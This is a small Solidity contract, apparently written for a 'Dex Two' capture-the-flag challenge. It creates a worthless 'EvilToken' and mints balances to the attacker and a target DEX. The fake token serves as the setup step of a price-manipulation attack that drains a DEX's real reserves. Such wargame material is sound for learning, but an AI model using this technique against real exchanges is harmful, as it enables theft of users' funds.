// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts-ethereum-package/contracts/token/ERC20/ERC20.sol";

contract DexTwoAttack is ERC20 {
    constructor(address _target) public ERC20("EvilToken", "EVL") {
        _mint(msg.sender, 300); // this is the amount we'll need
        _mint(_target, 100); // this is the amount for the contract
    }
}